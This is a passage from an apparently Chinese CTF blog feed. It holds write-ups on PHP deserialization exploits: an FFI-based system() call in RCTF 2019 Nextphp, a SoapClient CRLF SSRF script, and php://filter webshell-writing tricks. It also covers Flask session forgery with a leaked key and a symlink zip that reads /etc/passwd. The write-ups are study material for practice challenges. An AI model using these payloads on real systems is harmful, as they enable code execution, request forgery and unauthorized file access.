    <link href="/2020/04/07/RCTF-2019-Nextphp/"/>
    <url>/2020/04/07/RCTF-2019-Nextphp/</url>
    
    <content type="html"><![CDATA[<ol><li><p>给了一个shell ，但是禁用了很多函数，查看一下有哪些文件</p><pre><code class="hljs zephir">http:<span class="hljs-comment">//0b7a79bc-ce5f-48e9-b0cf-4702a2bc1601.node3.buuoj.cn/?a=var_dump(scandir(%27.%27));</span><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;preload.php&quot;</span> &#125;</code></pre></li><li><p>查看preload.php</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = [        <span class="hljs-string">&#x27;ret&#x27;</span> =&gt; <span class="hljs-literal">null</span>,        <span class="hljs-string">&#x27;func&#x27;</span> =&gt; <span class="hljs-string">&#x27;print_r&#x27;</span>,        <span class="hljs-string">&#x27;arg&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>    ];    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;ret&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;func&#x27;</span>](<span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;arg&#x27;</span>]);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__serialize</span>(<span class="hljs-params"></span>): <span class="hljs-title">array</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>) </span>&#123;        array_merge(<span class="hljs-keyword">$this</span>-&gt;data, <span class="hljs-variable">$data</span>);        <span class="hljs-keyword">$this</span>-&gt;run();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span> (<span class="hljs-params"></span>): <span class="hljs-title">string</span> </span>&#123;        <span class="hljs-keyword">return</span> serialize(<span class="hljs-keyword">$this</span>-&gt;data);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;data = unserialize(<span class="hljs-variable">$payload</span>);        <span class="hljs-keyword">$this</span>-&gt;run();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span> (<span class="hljs-params"><span class="hljs-variable">$key</span></span>) </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-variable">$key</span>];    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span> (<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;No implemented&#x27;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;No implemented&#x27;</span>);    &#125;&#125;</code></pre></li><li><p>利用php7.4 的新特性    预加载+FFI</p><ul><li><p>预编译  </p><p>预加载的原理就是将类提前加载到内存中，所以说Class A 一直在内存里</p><p>所以在index.php中可以访问到A类</p></li><li><p><strong>FFI</strong> 拓展</p><p>结合 <a href="https://wiki.php.net/rfc/ffi">https://wiki.php.net/rfc/ffi</a> 可以调用 <strong>C</strong> 函数</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// create FFI object, loading libc and exporting function printf()</span><span class="hljs-variable">$ffi</span> = FFI::cdef(    <span class="hljs-string">&quot;int printf(const char *format, ...);&quot;</span>, <span class="hljs-comment">// this is regular C declaration</span>    <span class="hljs-string">&quot;libc.so.6&quot;</span>);<span class="hljs-comment">// call C printf()</span><span class="hljs-variable">$ffi</span>-&gt;printf(<span class="hljs-string">&quot;Hello %s!\n&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>);<span class="hljs-comment">//这里是调用了printf</span></code></pre><p>结合代码构造payload 调用c中sysytem函数</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = [        <span class="hljs-string">&#x27;ret&#x27;</span> =&gt; <span class="hljs-literal">null</span>,        <span class="hljs-string">&#x27;func&#x27;</span> =&gt; <span class="hljs-string">&#x27;FFI::cdef&#x27;</span>,        <span class="hljs-string">&#x27;arg&#x27;</span> =&gt; <span class="hljs-string">&#x27;int system(const char *command);&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span> (<span class="hljs-params"></span>): <span class="hljs-title">string</span> </span>&#123;        <span class="hljs-keyword">return</span> serialize(<span class="hljs-keyword">$this</span>-&gt;data);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;data = unserialize(<span class="hljs-variable">$payload</span>);        <span class="hljs-keyword">$this</span>-&gt;run();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span> (<span class="hljs-params"></span>) </span>&#123;    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A;<span class="hljs-keyword">echo</span>  serialize(<span class="hljs-variable">$a</span>);</code></pre><p><code>?a=$b=unserialize(&#39;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#39;)-&gt;ret;$b-&gt;system(&quot;cat /flag&gt;b.txt&quot;);</code></p><p>查看b.txt即可</p></li></ul></li></ol><p>参考：</p><p><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp</a></p><p><a href="https://cjm00n.top/CTF/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952.html">https://cjm00n.top/CTF/BuuCTF刷题记录2.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MRCTF2020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SoapClient反序列化SSRF</title>
    <link href="/2020/04/06/SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96SSRF/"/>
    <url>/2020/04/06/SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96SSRF/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.php.net/manual/zh/class.soapclient.php">https://www.php.net/manual/zh/class.soapclient.php</a></p><p><a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p></blockquote><h3 id="Deserialization-call-SoapClient-CRLF-SSRF"><a href="#Deserialization-call-SoapClient-CRLF-SSRF" class="headerlink" title="Deserialization + __call + SoapClient + CRLF = SSRF"></a><code>Deserialization + __call + SoapClient + CRLF = SSRF</code></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://127.0.0.1:5555/path&#x27;</span>;<span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=something&#x27;</span>;<span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,    <span class="hljs-string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span>    );<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>.(<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>      =&gt; <span class="hljs-string">&quot;aaab&quot;</span>));<span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$aaa</span>);<span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-variable">$aaa</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$aaa</span>;<span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$aaa</span>);<span class="hljs-variable">$c</span>-&gt;not_exists_function();<span class="hljs-meta">?&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>知识点总结</tag>
      
      <tag>SoapClient反序列化SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>P神小密圈的笔记1-php://filter</title>
    <link href="/2020/04/05/P%E7%A5%9E%E5%B0%8F%E5%AF%86%E5%9C%88%E7%9A%84%E7%AC%94%E8%AE%B01-phpfilter/"/>
    <url>/2020/04/05/P%E7%A5%9E%E5%B0%8F%E5%AF%86%E5%9C%88%E7%9A%84%E7%AC%94%E8%AE%B01-phpfilter/</url>
    
    <content type="html"><![CDATA[<blockquote><p>学习链接：</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA">https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA</a></p><p><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a></p></blockquote><p>file_put_contents()函数和php://filter结合使用绕过一些限制，例如<code>file_put_contents($filename,”&lt;?php exit();”.$content);  file_put_contents($filename,”&lt;?php exit();”.$filename);</code> 绕过死亡exit写shell，比较妙的是php://filter协议支持了很多种过滤器。</p><h4 id="file-put-contents-filename-”-lt-php-exit-”-content"><a href="#file-put-contents-filename-”-lt-php-exit-”-content" class="headerlink" title="file_put_contents($filename,”&lt;?php exit();”.$content);"></a><code>file_put_contents($filename,”&lt;?php exit();”.$content);</code></h4><ol><li><p>Base64 </p><pre><code class="hljs awk"><span class="hljs-variable">$filename</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.base64-decode/</span>resource=Cyc1e.php<span class="hljs-variable">$content</span>=aPD9waHAgcGhwaW5mbygpOz8+  <span class="hljs-comment">#base64为4个一组，所以说要加一个a</span></code></pre></li><li><p>Rot13</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span> =&gt; <span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span> -&gt; <span class="hljs-variable">$content</span>php:<span class="hljs-comment">//filter/write=string.rot13/resource=Cyc1e.php  -&gt; $filename</span></code></pre></li><li><p>strip_tags+base64</p><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml"> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt;?&gt;PD9waHAgcGhwaW5mbygpOz8+ -&gt; $content #这里由于`</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>();`不是完整的标签，所以需要补上’<span class="hljs-meta">?&gt;</span></span><span class="xml">‘进行补全</span><span class="xml">php://filter/write=string.strip_tags|convert.base64-decode/resource=Cyc1e.php  -&gt; $filename</span></code></pre></li></ol><h4 id="file-put-contents-a-”-lt-php-exit-”-a"><a href="#file-put-contents-a-”-lt-php-exit-”-a" class="headerlink" title="file_put_contents($a,”&lt;?php exit();”.$a);"></a><code>file_put_contents($a,”&lt;?php exit();”.$a);</code></h4><ol><li><p>Rot13</p><pre><code class="hljs livecodeserver">$<span class="hljs-keyword">a</span> = php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13|<span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span>|/resource=Cyc1e.php</code></pre></li><li><p>iconv字符编码转换</p><pre><code class="hljs autoit">$a=<span class="hljs-string">&#x27;php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=Cyc1e.php&#x27;</span><span class="hljs-comment">;</span>**<span class="hljs-literal">or</span>**$a=<span class="hljs-string">&#x27;php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=Cyc1e.php&#x27;</span><span class="hljs-comment">;</span><span class="hljs-meta">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?<span class="hljs-comment">;)之前字符个数是4的倍数，所以需要补3个字符</span></span></code></pre></li><li><p>组合</p><pre><code class="hljs nix">$<span class="hljs-attr">a</span> = &#x27;php://filter/<span class="hljs-attr">write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc</span> cucvcsa(b;)&gt;?/<span class="hljs-attr">resource=Cyc1e.php&#x27;;</span> <span class="hljs-comment">#同样需要补位，这里补了一个x</span></code></pre></li><li><p>组合</p><pre><code class="hljs clean">$a=<span class="hljs-string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php&#x27;</span>; #base64编码前补了AA，原理一样，补齐位数############$a = <span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../Cyc1e.php&#x27;</span>;</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小密圈</tag>
      
      <tag>知识点总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pop链构造</title>
    <link href="/2020/04/05/pop%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <url>/2020/04/05/pop%E9%93%BE%E6%9E%84%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p></blockquote><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>   <a href="https://www.php.net/manual/zh/language.oop5.decon.php#object.construct">__construct()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.decon.php#object.destruct">__destruct()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call">__call()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic">__callStatic()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">__invoke()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.set-state">__set_state()</a>，   <a href="https://www.php.net/manual/zh/language.oop5.cloning.php#object.clone">__clone()</a> 和    <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.debuginfo">__debugInfo()</a>   等方法在 PHP 中被称为魔术方法（Magic   methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。  </p><ol><li><p><code>__sleep()</code>和<code>__wakeup()</code></p><p>serialize()前会先执行__sleep()</p><p>unserialize()前会执行__wakeup()</p></li></ol><ol start="2"><li><p><code>__toString</code></p><p>用于一个类被当成字符串时应怎样回应,比如 echo $obj; 正则匹配</p><pre><code class="hljs perl">需要指出的是在 PHP <span class="hljs-number">5.2</span>.<span class="hljs-number">0</span> 之前，__toString() 方法只有在直接使用于 echo 或 <span class="hljs-keyword">print</span> 时才能生效。PHP <span class="hljs-number">5.2</span>.<span class="hljs-number">0</span> 之后，则可以在任何字符串环境生效（例如通过 <span class="hljs-keyword">printf</span>()，使用 %s 修饰符），但不能用于非字符串环境（如使用 %d 修饰符）。自 PHP <span class="hljs-number">5.2</span>.<span class="hljs-number">0</span> 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 E_RECOVERABLE_ERROR 级别的错误。</code></pre></li></ol><ol start="3"><li><p><code>__invoke()</code></p><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用</p><pre><code class="hljs plain">本特性只在 PHP 5.3.0 及以上版本有效。</code></pre></li></ol><ol start="4"><li><p><code>__set_state()</code>和<code>__debugInfo()</code></p><p>自 PHP 5.1.0 起当调用 <a href="https://www.php.net/manual/zh/function.var-export.php">var_export()</a> 导出类时，此<code>__set_state()</code>方法会被调用。   </p><p>自 PHP 5.6.0 起当调用 <a href="https://www.php.net/manual/zh/function.var-dump.php">var_dump()</a> 导出类时，此<code>__debugInfo()</code>方法会被调用。   </p></li></ol><ol start="5"><li><p><code>__construct()</code></p><p>PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。  </p></li></ol><ol start="6"><li><p><code>__destruct</code>()</p><p>PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，如   C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p></li></ol><ol start="7"><li><p><code>__call()</code>和<code>__callStatic()</code>    方法重载</p><p>​    在对象中调用一个不可访问方法时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call">__call()</a> 会被调用。   </p><p>​    在静态上下文中调用一个不可访问方法时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic">__callStatic()</a> 会被调用。   </p></li></ol><ol start="8"><li><p><code>__set __get __isset __unset</code></p><p> 在给不可访问属性赋值时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> 会被调用。   </p><p> 读取不可访问属性的值时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> 会被调用。   </p><p> 当对不可访问属性调用 <a href="https://www.php.net/manual/zh/function.isset.php">isset()</a> 或    <a href="https://www.php.net/manual/zh/function.empty.php">empty()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a>    会被调用。   </p><p> 当对不可访问属性调用 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a>     会被调用。 </p></li></ol><ol start="9"><li><p><code>__clone</code></p><p>当复制完成时，如果定义了 <a href="https://www.php.net/manual/zh/language.oop5.cloning.php#object.clone">__clone()</a>   方法，则新创建的对象（复制生成的对象）中的 <a href="https://www.php.net/manual/zh/language.oop5.cloning.php#object.clone">__clone()</a>   方法会被调用，可用于修改属性的值（如果有必要的话）。  </p></li></ol><p>总：</p><ul><li>构造函数 <code>__construct</code> 对象被创建的时候调用</li><li>析构函数 <code>__destruct</code> 对象被销毁的时候调用</li><li>方法重载 <code>__call</code> 在对象中调用一个不可访问方法时调用</li><li>方法重载 <code>__callStatic</code> 在静态上下文中调用一个不可访问方法时调用</li><li>在给不可访问属性赋值时，<code>__set()</code> 会被调用。</li><li>读取不可访问属性的值时，<code>__get()</code> 会被调用。</li><li>当对不可访问属性调用 <code>isset()</code> 或 <code>empty()</code> 时，<code>__isset()</code> 会被调用</li><li>当对不可访问属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用</li><li><code>__sleep()</code> 在<code>serialize()</code> 函数执行之前调用</li><li><code>__wakeup()</code> 在<code>unserialize()</code> 函数执行之前调用</li><li><code>__toString</code> 在一个类被当成字符串时被调用（不仅仅是echo的时候,比如file_exists()判断也会触发</li></ul><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化</p><p><a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p><p>SoapClient反序列化</p><p>compress.zlib://phar://    phar</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>知识点总结</tag>
      
      <tag>pop链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JWT伪造</title>
    <link href="/2020/04/03/Flask-session%E4%BC%AA%E9%80%A0/"/>
    <url>/2020/04/03/Flask-session%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>P神客户端 session 导致的安全问题：<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>Flask session生成/解密工具：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>JWT: <a href="https://jwt.io/">https://jwt.io/</a></p></blockquote><p>JWT伪造找到用来加密的secret key</p><h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><blockquote><p>WP: <a href="https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md">https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md</a></p></blockquote><p>/robots.txt  –&gt; /filebak 下有源码</p><p>存在一个erb模版注入  ruby全局变量$’ 可以获取上一个匹配的值用来爆 JWT secret</p><pre><code class="hljs apache"><span class="hljs-comment">##$`   匹配文本之前的文本</span><span class="hljs-comment">##$&#x27;   匹配文本之后的文本</span><span class="hljs-attribute">alert</span>(&#x27;f<span class="hljs-number">3</span>b<span class="hljs-number">930</span>b<span class="hljs-number">6136832</span>b<span class="hljs-number">335</span>aade<span class="hljs-number">3</span>df<span class="hljs-number">638</span>e<span class="hljs-number">868</span>f<span class="hljs-number">3</span>d<span class="hljs-number">281722979</span>d<span class="hljs-number">9</span>ecce<span class="hljs-number">5</span>ea<span class="hljs-number">32</span>e<span class="hljs-number">09</span>efcf<span class="hljs-number">0</span>f<span class="hljs-number">32</span>fb<span class="hljs-number">9</span>e<span class="hljs-number">1</span>d<span class="hljs-number">98209275</span>d<span class="hljs-number">243</span>f<span class="hljs-number">51574</span>ce<span class="hljs-number">05</span>e<span class="hljs-number">43</span>cbc<span class="hljs-number">8</span>b<span class="hljs-number">1</span>ea<span class="hljs-number">9</span>b<span class="hljs-number">2089</span>c<span class="hljs-number">7</span>e<span class="hljs-number">0</span>f<span class="hljs-number">6436</span>fdb<span class="hljs-number">9</span>b<span class="hljs-number">1</span>b<span class="hljs-number">5</span> working successfully!&#x27;)</code></pre><p>在线进行解密伪造 <a href="https://jwt.io/">https://jwt.io/</a>  </p><p>还有一种非预期getshell看这里  <a href="https://evoa.me/index.php/archives/61/">https://evoa.me/index.php/archives/61/</a></p><h1 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h1><p>404页面返回头里有个Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==，base64解密发现是  SECRET_KEY:keyqqqwwweee!@#$%^&amp;*，上脚本伪造</p><pre><code class="hljs scilab">python flask_session_cookie_manager3.py decode -c <span class="hljs-string">&quot;eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMSIsInVzZXJuYW1lIjoiMSJ9.XodXoQ.UTdjiqWx9iwPZFY145-VECE-r1w&quot;</span> -s <span class="hljs-string">&quot;keyqqqwwweee!@#$%^&amp;*&quot;</span>&#123;<span class="hljs-string">&#x27;id&#x27;</span>: b&#x27;<span class="hljs-number">100</span><span class="hljs-string">&#x27;, &#x27;</span>is_login&#x27;: True, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;keyqqqwwweee!@#$%^&amp;*&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;</span>id&#x27;: b&#x27;<span class="hljs-number">1</span><span class="hljs-string">&#x27;, &#x27;</span>is_login&#x27;: True, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<span class="hljs-string">&quot;</span><span class="hljs-string">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMSIsInVzZXJuYW1lIjoiMSJ9.XomwAQ.-NZX9U_Y-rtN0KW5lCe9_wjxCWQ</span></code></pre><p>后面一个知识点是软连接读文件。</p><pre><code class="hljs awk">ln -s <span class="hljs-regexp">/etc/</span>passwd passwdzip --symlinks passwd.zip passwd</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUOJ</tag>
      
      <tag>Flask session JWT</tag>
      
      <tag>erb模版注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU 1 分题(大佬眼中的qvq)</title>
    <link href="/2020/04/02/BUU-1-%E5%88%86%E9%A2%98-%E5%A4%A7%E4%BD%AC%E7%9C%BC%E4%B8%AD%E7%9A%84qvq/"/>
    <url>/2020/04/02/BUU-1-%E5%88%86%E9%A2%98-%E5%A4%A7%E4%BD%AC%E7%9C%BC%E4%B8%AD%E7%9A%84qvq/</url>
    
